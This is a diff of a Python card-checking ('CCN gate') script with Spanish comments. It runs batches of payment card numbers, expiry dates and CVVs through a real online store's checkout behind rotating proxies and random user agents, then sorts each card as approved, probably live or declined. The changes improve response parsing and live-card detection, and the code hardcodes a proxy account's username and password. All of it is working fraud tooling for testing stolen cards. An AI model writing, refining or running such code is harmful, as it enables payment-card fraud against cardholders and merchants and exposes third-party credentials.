@@ -51,7 +51,7 @@ def ccn_gate(card):
     
     # 1. Validación de formato y preparación de datos
     if card.count('|') < 3:
-        # Aquí, SÍ devolvemos la tarjeta para que el bot sepa qué falló
+        # Devuelve la tarjeta en caso de error de formato (para que el bot sepa cuál línea falló)
         return f"{card}|ERROR|Formato Incompleto|N/A|" 
 
     cc_number, mes, ano_number, cvv = card.split('|')
@@ -72,11 +72,7 @@ def ccn_gate(card):
             cliente.proxies = {"https": "http://ckwvyrbn-rotate:9bdwth8dgwwq@p.webshare.io:80"}
             agente_user = UserAgent().random
 
-            # Flujo de Compra/Checkout (omitido por espacio, asume que funciona)
-
             #============[Requests 1-6: Flujo de Compra/Checkout]============#
-            # (El código es idéntico a la versión anterior, solo se omite para no repetir líneas)
-            
             headers = {"User-Agent": agente_user, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" }
             result  = cliente.get(url="https://glorybee.com/queen-excluders", headers=headers)
             form_key = capture(result.text, 'name="form_key" type="hidden" value="', '"')
@@ -115,14 +111,19 @@ def ccn_gate(card):
                 message_text_raw = capture(payment_response, '"message":"', '"')
                 message_code = capture(payment_response, '"code":"', '"')
                 
-                # Limpieza para que la tarjeta no aparezca en el mensaje
+                # --- SOLUCIÓN CRÍTICA: Extraer el mensaje del string completo ---
                 if message_text_raw and '|' in message_text_raw:
                     parts = message_text_raw.split('|')
-                    message_text = parts[5].strip() if len(parts) >= 6 else message_text_raw
+                    # Buscamos el mensaje real, generalmente después de 5 barras.
+                    # El mensaje real puede ser "APPROVED", "DECLINED", "CVV2 MISMATCH", etc.
+                    message_text = parts[5].strip() if len(parts) >= 6 and parts[5].strip() else parts[1].strip()
+                    # Si el mensaje contiene la tarjeta o es muy largo, usamos el código como fallback
+                    if len(message_text.split()) > 4 or cc_number in message_text:
+                        message_text = parts[1].strip() 
                 elif message_text_raw:
                      message_text = message_text_raw
             except Exception:
-                # Si falla el JSON
+                # Si falla el JSON (pasa a veces si la respuesta es HTTP)
                 if "invalid card number" in result.text.lower():
                     message_text = "Invalid Card Number"
                     message_code = "400"
@@ -135,14 +136,14 @@ def ccn_gate(card):
 
 
             #============[Lógica de Respuestas y RETORNO SIN TARJETA]============#
-            # NOTA: Los returns se modifican a STATUS|MESSAGE|CODE|
+            # Formato de retorno: STATUS|MESSAGE|CODE|
 
             # 1. Aprobada por AVS
             if "AVS FAILURE" in result.text:
                 return f"APPROVED|AVS FAILURE|{message_code}|" 
 
-            # 2. Live probable
-            elif "There was a problem with the request." in message_text:
+            # 2. Live probable (ej. "There was a problem with the request." / "Address not verified approved")
+            elif "There was a problem with the request." in message_text or "approved" in message_text.lower():
                 return f"PROBABLE LIVE|{message_text}|{message_code}|"
 
             # 3. CVV Match (Live)
@@ -150,7 +151,7 @@ def ccn_gate(card):
                 return f"APPROVED|CVV2 MISMATCH|{message_code}|"
 
             # 4. Rechazada/Declinada (El resto)
-            # Ejemplo de salida: DECLINED|DECLINED|000005|
+            # Retorna el mensaje extraído (ej: DECLINED) y el código.
             return f"DECLINED|{message_text}|{message_code}|"
             
         except Exception as e:
@@ -160,7 +161,6 @@ def ccn_gate(card):
             continue
             
     # Retorno si se agotan los reintentos
-    # En caso de error de conexión, devolvemos un mensaje de error sin la tarjeta
     return f"ERROR|Max Retries|Fallo de conexión o límite de intentos ({max_retries} reintentos)." 
 
 
@@ -174,7 +174,7 @@ if __name__ == "__main__":
                 if len(parts) >= 4:
                     cc, mes, ano, cvv = parts[:4]
                     card_input = f"{cc}|{mes}|{ano}|{cvv.strip()}"
-                    # Cuando se ejecuta localmente, se pasa la tarjeta para saber qué se chequeó
+                    # Para la ejecución local, combinamos la tarjeta y el resultado
                     gateway_result = f"{card_input}|{ccn_gate(card_input)}"
                     print(gateway_result)
                 else:
